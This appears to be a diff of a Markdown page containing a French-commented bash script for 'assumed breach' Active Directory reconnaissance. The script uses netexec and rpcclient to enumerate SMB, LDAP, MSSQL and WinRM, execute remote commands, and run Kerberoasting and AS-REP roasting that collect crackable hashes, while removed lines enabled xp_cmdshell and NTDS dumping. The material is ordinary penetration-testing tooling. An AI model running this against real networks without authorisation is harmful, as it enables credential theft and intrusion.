@@ -127,114 +127,273 @@ if __name__ == "__main__":
 
 ```bash
 #!/bin/bash
+# AD Recon Script - Mode Assumed Breach (Optimisé et complet avec mises à jour)
 
-# Configuration
+# Couleurs
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 CYAN='\033[0;36m'
+MAGENTA='\033[0;35m'
 NC='\033[0m'
-OUTPUT_DIR="AD_Recon_$(date +%Y%m%d_%H%M%S)"
-mkdir -p $OUTPUT_DIR/{bloodhound,shares,users,services}
 
 # Vérification des dépendances
 check_deps() {
-    command -v bloodhound-python >/dev/null 2>&1 || echo -e "${RED}[-] bloodhound-python non installé!${NC}"
-    command -v jq >/dev/null 2>&1 || echo -e "${RED}[-] jq non installé!${NC}"
+    command -v nxc >/dev/null 2>&1 || { echo -e "${RED}[-] nxc non installé !${NC}"; exit 1; }
+    command -v rpcclient >/dev/null 2>&1 || { echo -e "${RED}[-] rpcclient non installé !${NC}"; exit 1; }
 }
 
-# Fonction d'énumération SMB avancée
-smb_enum() {
-    echo -e "\n${CYAN}[=== SMB Enumération ===]${NC}"
-    
-    # Scan complet SMB
-    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --shares --sessions --disks --loggedon-users --users --groups --rid-brute --pass-pol --ntds --kerberos --gpo | tee $OUTPUT_DIR/smb_full.txt
-    
-    # Extraction des shares accessibles
-    grep "READ" $OUTPUT_DIR/smb_full.txt | awk '{print $2}' | sort -u > $OUTPUT_DIR/shares/available_shares.txt
-    
-    # Téléchargement des shares
-    while read share; do
-        echo -e "${YELLOW}[*] Téléchargement du share: $share${NC}"
-        smbclient -U "$DOMAIN/$USER%$PASSWORD" "//$IP/$share" -c "recurse; prompt; mget *" -Tc $OUTPUT_DIR/shares/${share}_download >/dev/null 2>&1
-    done < $OUTPUT_DIR/shares/available_shares.txt
-    
-    # Vérification des droits d'écriture
-    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --spider-share '.*' --check-write | tee $OUTPUT_DIR/shares/writable_shares.txt
+# Création des répertoires de sauvegarde dans ad_recon
+create_dirs() {
+    mkdir -p ad_recon/{live_hosts,smb,ldap,mssql,winrm,rpcclient,kerberoast,asreproast}
 }
 
-# Enumération LDAP complète
-ldap_enum() {
-    echo -e "\n${CYAN}[=== LDAP Enumération ===]${NC}"
-    
-    # Extraction users avec descriptions
-    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --users --verbose | tee $OUTPUT_DIR/ldap_full.txt
-    grep -i "description:" $OUTPUT_DIR/ldap_full.txt | awk -F '│' '{print $3,$5}' | column -t > $OUTPUT_DIR/users/user_descriptions.txt
-    
-    # Extraction propre des usernames
-    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --users --json | jq -r '.hosts[].users[] | .username' | sort -u > $OUTPUT_DIR/users/all_users.txt
-    
-    # Trusts et Password Policy
-    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --trusts --password-policy | tee $OUTPUT_DIR/ldap_trusts_pol.txt
+# Mise à jour du fichier known_hosts
+update_host_file() {
+    # Recherche d'IP dans l'output
+    ips=$(echo "$1" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
+    for ip in $ips; do
+        if [ ! -f ad_recon/known_hosts.txt ] || ! grep -q "$ip" ad_recon/known_hosts.txt; then
+            echo "$ip" >> ad_recon/known_hosts.txt
+            echo -e "${MAGENTA}[!!!] Nouveau host découvert: $ip. Mettez à jour le host file.${NC}"
+        fi
+    done
+    # Recherche de domaines dans l'output (format domain:XYZ)
+    domains=$(echo "$1" | grep -oE 'domain:[^ )]+' | cut -d':' -f2)
+    for domain in $domains; do
+        if [ ! -f ad_recon/known_hosts.txt ] || ! grep -q "$domain" ad_recon/known_hosts.txt; then
+            echo "$domain" >> ad_recon/known_hosts.txt
+            echo -e "${MAGENTA}[!!!] Nouveau domaine découvert: $domain. Mettez à jour le host file.${NC}"
+        fi
+    done
 }
 
-# Enumération MSSQL
-mssql_enum() {
-    echo -e "\n${CYAN}[=== MSSQL Enumération ===]${NC}"
-    
-    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --query "SELECT name FROM sys.databases" | tee $OUTPUT_DIR/services/mssql_databases.txt
-    
-    # Test xp_cmdshell
-    echo -e "${YELLOW}[*] Test xp_cmdshell${NC}"
-    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --enable-xp-cmdshell
-    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --xp-cmd "whoami /all" | tee $OUTPUT_DIR/services/mssql_xp_cmdshell.txt
+# Pause interactive
+pause() {
+    read -p "$(echo -e ${YELLOW}"[*] Continuer à l'étape suivante ? (Y/n):"${NC})" response
+    [[ "$response" =~ ^[Nn]$ ]] && { echo -e "${RED}[-] Arrêt du script.${NC}"; exit 1; }
 }
 
-# Enumération RDP
-rdp_enum() {
-    echo -e "\n${CYAN}[=== RDP Checks ===]${NC}"
-    netexec winrm $IP -u $USER -p $PASSWORD -d $DOMAIN --local-groups --users | tee $OUTPUT_DIR/services/rdp_access.txt
-}
-
-# BloodHound Ingestor
-bloodhound_enum() {
-    echo -e "\n${CYAN}[=== BloodHound Collection ===]${NC}"
-    
-    if command -v bloodhound-python &> /dev/null; then
-        bloodhound-python -c All -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -dc "$IP" --zip --dns-tcp --disable-pooling -o "$OUTPUT_DIR/bloodhound"
-        echo -e "${GREEN}[+] Fichiers BloodHound générés dans: $OUTPUT_DIR/bloodhound${NC}"
+# Vérification des hôtes vivants (exemple avec ping)
+live_hosts() {
+    echo -e "\n${CYAN}[=== Vérification des hôtes vivants ===]${NC}"
+    result=$(ping -c 1 "$IP" 2>&1)
+    if [ -n "$result" ]; then
+        echo "$result"
+        echo -e "${GREEN}[+] Commande ping exécutée avec succès.${NC}"
+        update_host_file "$result"
+        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder la liste des hôtes vivants ? (Y/n):"${NC})" answer
+        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+            echo "$result" > ad_recon/live_hosts/live_hosts.txt
+            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/live_hosts/live_hosts.txt.${NC}"
+        fi
     else
-        echo -e "${RED}[-] bloodhound-python non installé!${NC}"
+        echo -e "${RED}[-] Échec de la vérification des hôtes vivants ou output nul.${NC}"
     fi
 }
 
-# Low Hanging Fruits Checks
-low_hanging_fruits() {
-    echo -e "\n${CYAN}[=== Low Hanging Fruits ===]${NC}"
-    
-    # Password Policy
-    grep "Password Policy" $OUTPUT_DIR/ldap_trusts_pol.txt | tee $OUTPUT_DIR/lhf/password_policy.txt
-    
-    # AS-REP Roastable Users
-    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --asreproast | tee $OUTPUT_DIR/lhf/asrep_roast.txt
-    
-    # Admin Access Check
-    netexec smb $IP -u $USER -p $PASSWORD -d $DOMAIN --admin-check | tee $OUTPUT_DIR/lhf/admin_access.txt
-    
-    # MSSQL Admin Check
-    netexec mssql $IP -u $USER -p $PASSWORD -d $DOMAIN --is-admin | tee $OUTPUT_DIR/lhf/mssql_admin.txt
-    
-    # Unconstrained Delegation
-    netexec ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --unconstrained | tee $OUTPUT_DIR/lhf/unconstrained_deleg.txt
-    
-    # GPO vulnérables
-    grep -i "vulnerable" $OUTPUT_DIR/smb_full.txt | tee $OUTPUT_DIR/lhf/vuln_gpo.txt
+# Énumération SMB
+smb_enum() {
+    echo -e "\n${CYAN}[=== Énumération SMB ===]${NC}"
+    result=$(nxc smb "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --shares 2>&1)
+    if [ -n "$result" ]; then
+        echo "$result"
+        echo -e "${GREEN}[+] Commande SMB exécutée avec succès.${NC}"
+        update_host_file "$result"
+        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats SMB ? (Y/n):"${NC})" answer
+        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+            echo "$result" > ad_recon/smb/smb_enum.txt
+            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/smb/smb_enum.txt.${NC}"
+        fi
+    else
+        echo -e "${RED}[-] Échec de l'énumération SMB ou output nul.${NC}"
+    fi
 }
 
-# Main
+# Énumération LDAP
+ldap_enum() {
+    echo -e "\n${CYAN}[=== Énumération LDAP ===]${NC}"
+    result=$(nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --users 2>&1)
+    if [ -n "$result" ]; then
+        echo "$result"
+        echo -e "${GREEN}[+] Commande LDAP exécutée avec succès.${NC}"
+        if echo "$result" | grep -qi "user"; then
+            echo -e "${MAGENTA}[!!!] Liste d'utilisateurs détectée dans LDAP.${NC}"
+        fi
+        if echo "$result" | grep -iE "admin|local admin" >/dev/null; then
+            echo -e "${MAGENTA}[!!!] Droit(s) d'admin détecté(s) dans LDAP.${NC}"
+        fi
+        update_host_file "$result"
+        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats LDAP ? (Y/n):"${NC})" answer
+        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+            echo "$result" > ad_recon/ldap/ldap_enum.txt
+            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/ldap/ldap_enum.txt.${NC}"
+        fi
+    else
+        echo -e "${RED}[-] Échec de l'énumération LDAP ou output nul.${NC}"
+    fi
+}
+
+# Énumération MSSQL
+mssql_enum() {
+    echo -e "\n${CYAN}[=== Énumération MSSQL ===]${NC}"
+    result=$(nxc mssql "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --query 'SELECT name FROM sys.databases' 2>&1)
+    if [ -n "$result" ]; then
+        echo "$result"
+        echo -e "${GREEN}[+] Commande MSSQL exécutée avec succès.${NC}"
+        update_host_file "$result"
+        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats MSSQL ? (Y/n):"${NC})" answer
+        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+            echo "$result" > ad_recon/mssql/mssql_enum.txt
+            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/mssql/mssql_enum.txt.${NC}"
+        fi
+    else
+        echo -e "${RED}[-] Échec de l'énumération MSSQL ou output nul.${NC}"
+    fi
+}
+
+# Vérifications WinRM
+winrm_enum() {
+    echo -e "\n${CYAN}[=== Vérifications WinRM ===]${NC}"
+    result=$(nxc winrm "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -X whoami 2>&1)
+    if [ -n "$result" ]; then
+        echo "$result"
+        echo -e "${GREEN}[+] Commande WinRM exécutée avec succès.${NC}"
+        update_host_file "$result"
+        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder la sortie WinRM ? (Y/n):"${NC})" answer
+        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+            echo "$result" > ad_recon/winrm/winrm_enum.txt
+            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/winrm/winrm_enum.txt.${NC}"
+        fi
+    else
+        echo -e "${RED}[-] Échec des vérifications WinRM ou output nul.${NC}"
+    fi
+}
+
+# Énumération RPCClient (avec et sans credentials)
+rpcclient_enum() {
+    echo -e "\n${CYAN}[=== Énumération RPCClient (avec credentials) ===]${NC}"
+    result=$(rpcclient -U "$USER%$PASSWORD" "$IP" -c "enumdomusers" 2>&1)
+    if [ -n "$result" ]; then
+        echo "$result"
+        echo -e "${GREEN}[+] Commande rpcclient (avec creds) exécutée avec succès.${NC}"
+        if echo "$result" | grep -qi "user"; then
+            echo -e "${MAGENTA}[!!!] Liste d'utilisateurs trouvée via rpcclient (avec creds).${NC}"
+        fi
+        update_host_file "$result"
+        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats rpcclient (avec creds) ? (Y/n):"${NC})" answer
+        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+            echo "$result" > ad_recon/rpcclient/rpcclient_enum_creds.txt
+            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/rpcclient/rpcclient_enum_creds.txt.${NC}"
+        fi
+    else
+        echo -e "${RED}[-] Échec de l'énumération rpcclient (avec creds) ou output nul.${NC}"
+    fi
+
+    echo -e "\n${CYAN}[=== Énumération RPCClient (sans credentials) ===]${NC}"
+    result2=$(rpcclient -N "$IP" -c "enumdomusers" 2>&1)
+    if [ -n "$result2" ]; then
+        echo "$result2"
+        echo -e "${GREEN}[+] Commande rpcclient (sans creds) exécutée avec succès.${NC}"
+        if echo "$result2" | grep -qi "user"; then
+            echo -e "${MAGENTA}[!!!] Liste d'utilisateurs trouvée via rpcclient (sans creds).${NC}"
+        fi
+        update_host_file "$result2"
+        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats rpcclient (sans creds) ? (Y/n):"${NC})" answer
+        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+            echo "$result2" > ad_recon/rpcclient/rpcclient_enum_nocreds.txt
+            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/rpcclient/rpcclient_enum_nocreds.txt.${NC}"
+        fi
+    else
+        echo -e "${RED}[-] Échec de l'énumération rpcclient (sans creds) ou output nul.${NC}"
+    fi
+}
+
+# Extraction et affichage de tous les usernames depuis preusers.txt
+list_usernames() {
+    echo -e "\n${CYAN}[=== Extraction des Usernames depuis preusers.txt ===]${NC}"
+    if [ -f preusers.txt ]; then
+        echo -e "${YELLOW}[***] Usernames détectés :${NC}"
+        awk '/^SMB/ {
+            if ($5=="[+]" || $5=="[*]") { print $6 } 
+            else if($5 != "-Username-") { print $5 }
+        }' preusers.txt | sort | uniq
+    else
+        echo -e "${RED}[-] Le fichier preusers.txt n'existe pas.${NC}"
+    fi
+}
+
+# Scan Kerberoasting (avec nxc ldap et la bonne syntaxe)
+kerberoast_scan() {
+    echo -e "\n${CYAN}[=== Scan Kerberoasting ===]${NC}"
+    tmp_file="temp_kerberoast.txt"
+    nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoasting "$tmp_file" 2>&1
+    if [ -f "$tmp_file" ]; then
+        result=$(cat "$tmp_file")
+        if [ -n "$result" ]; then
+            echo "$result"
+            echo -e "${GREEN}[+] Commande Kerberoasting exécutée avec succès.${NC}"
+            update_host_file "$result"
+            if echo "$result" | grep -qi "important"; then
+                echo -e "${MAGENTA}[!!!] Information critique détectée dans Kerberoasting !${NC}"
+            fi
+            read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats Kerberoasting ? (Y/n):"${NC})" answer
+            if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+                mv "$tmp_file" ad_recon/kerberoast/kerberoast_scan.txt
+                echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/kerberoast/kerberoast_scan.txt.${NC}"
+            else
+                rm "$tmp_file"
+            fi
+        else
+            echo -e "${RED}[-] Échec du scan Kerberoasting ou output nul.${NC}"
+            rm "$tmp_file"
+        fi
+    else
+        echo -e "${RED}[-] Échec du scan Kerberoasting ou fichier de sortie non généré.${NC}"
+    fi
+}
+
+# Scan ASREProasting (avec nxc ldap et la bonne syntaxe)
+asreproast_scan() {
+    echo -e "\n${CYAN}[=== Scan ASREProasting ===]${NC}"
+    tmp_file="temp_asreproast.txt"
+    nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --asreproast "$tmp_file" 2>&1
+    if [ -f "$tmp_file" ]; then
+        result=$(cat "$tmp_file")
+        if [ -n "$result" ]; then
+            echo "$result"
+            echo -e "${GREEN}[+] Commande ASREProasting exécutée avec succès.${NC}"
+            update_host_file "$result"
+            if echo "$result" | grep -qi "important"; then
+                echo -e "${MAGENTA}[!!!] Information critique détectée dans ASREProasting !${NC}"
+            fi
+            read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats ASREProasting ? (Y/n):"${NC})" answer
+            if [[ ! "$answer" =~ ^[Nn]$ ]]; then
+                mv "$tmp_file" ad_recon/asreproast/asreproast_scan.txt
+                echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/asreproast/asreproast_scan.txt.${NC}"
+            else
+                rm "$tmp_file"
+            fi
+        else
+            echo -e "${RED}[-] Échec du scan ASREProasting ou output nul.${NC}"
+            rm "$tmp_file"
+        fi
+    else
+        echo -e "${RED}[-] Échec du scan ASREProasting ou fichier de sortie non généré.${NC}"
+    fi
+}
+
+# Rapport final : recherche étendue des points d'intérêt dans ad_recon
+final_report() {
+    echo -e "\n${GREEN}[+] Recon terminé !${NC}"
+    echo -e "${YELLOW}[*] Points d'intérêt détectés dans les résultats :${NC}"
+    grep -Ri 'admin\|pwned\|user\|exec' ad_recon || echo -e "${RED}[-] Aucun point d'intérêt détecté.${NC}"
+}
+
+# MAIN
 if [ $# -ne 4 ]; then
-    echo -e "${RED}Usage: $0 <IP> <USER> <PASSWORD> <DOMAIN>${NC}"
+    echo -e "${RED}[-] Usage: $0 <IP> <USER> <PASSWORD> <DOMAIN>${NC}"
     exit 1
 fi
 
@@ -244,28 +403,38 @@ PASSWORD=$3
 DOMAIN=$4
 
 check_deps
+create_dirs
+
+live_hosts
+pause
+
 smb_enum
+pause
+
 ldap_enum
+pause
+
 mssql_enum
-rdp_enum
-bloodhound_enum
-low_hanging_fruits
+pause
 
-# Mise à jour DNS
-echo -e "\n${CYAN}[=== DNS Update ===]${NC}"
-grep -iE "(Domain|Forest):" $OUTPUT_DIR/ldap_*.txt | awk '{print $NF}' | sort -u | while read domain; do
-    echo "$IP $domain" | sudo tee -a /etc/hosts
-    echo "$IP $(echo $domain | cut -d'.' -f1)" | sudo tee -a /etc/hosts
-    
-    # Zone Transfer Test
-    dig @$IP $domain axfr | tee $OUTPUT_DIR/dns_zone_transfer.txt
-done
+winrm_enum
+pause
 
-# Rapport Final
-echo -e "\n${GREEN}[+] Recon complete!${NC}"
-echo -e "${CYAN}[*] Points d'intérêt:${NC}"
-grep -iHn "vulnerable\|writable\|admin\|asrep\|delegation" $OUTPUT_DIR/*/*.txt
-echo -e "\n${GREEN}[+] Les credentials BloodHound: $USER:$PASSWORD${NC}"
+rpcclient_enum
+pause
+
+# Extraction des usernames depuis preusers.txt
+list_usernames
+pause
+
+# Scans complémentaires
+kerberoast_scan
+pause
+
+asreproast_scan
+pause
+
+final_report
 ```
 
 </details>
